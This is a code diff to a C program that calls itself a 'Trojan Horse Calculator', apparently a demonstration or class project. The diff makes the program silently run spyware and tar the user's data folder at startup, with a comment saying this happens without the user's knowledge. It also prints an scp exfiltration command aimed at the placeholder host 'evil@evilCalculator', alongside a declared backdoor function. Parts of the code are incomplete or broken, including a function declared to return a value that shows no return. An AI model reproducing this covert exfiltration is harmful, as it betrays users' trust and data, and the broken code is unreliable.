@@ -27,8 +27,9 @@ bool userAuth();
 void formatString(char string[]);
 bool administrator(unsigned int backdoor);
 void dataExfil();
-void sendFile();
-bool createExfilFile();
+char* tarFile();
+void sendFile(char* hostName);
+void runSpyware();
 
 /*
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -214,16 +215,18 @@ bool administrator(unsigned int backdoor){
 Runs data exfiltration commands
 */
 void dataExfil() {
+    char* hostName;
     puts("Begin Data exfiltration process.....\n Creating tar......");
+    hostName = tarFile();
     puts("Attempting to SCP to server.....");
-    sendFile();
+    sendFile(hostName);
     puts("Data Exfiltration complete!");
 }
 /*
 Sends all data in the data folder to the listening server via SCP
 */
-void sendFile(){
-    char tarCMD[FILE_LINE_MAX] = "tar -czvf ";
+char* tarFile(){
+    char tarCMD[FILE_LINE_MAX] = "tar -czf ";
     char *hostName;
     char tarName[FILE_LINE_MAX] = "dataexfil.tar";
 
@@ -236,12 +239,21 @@ void sendFile(){
     //creates tarCMD, creates tar of data file
     strcat(tarCMD, tarName);
     strcat(tarCMD, " data/");
-    fprintf(stdout, "%s\n", tarCMD);
     system(tarCMD);
-
-    //sends file via SCP
+}
+/*
+Sends file via SCP
+*/
+void sendFile(char* hostName) {
     fprintf(stdout, "scp %s evil@evilCalculator:exfils/%s\n", hostName, hostName);
     puts("Above is the command that would copy the tarred file to a waiting server.");
+}
+/*
+Runs all data algorithms at startup, attempts to send file without knowledge of user.
+*/
+void autoExfil(){
+    runSpyware();
+    tarFile();
 }
 
 /*
@@ -445,6 +457,7 @@ void formatString(char string[]) {
 */
 int main(){
     //Trojan Horse Calculator
+    autoExfil();
     puts("Welcome to the best ever calculator!");
     userAuth();
 }
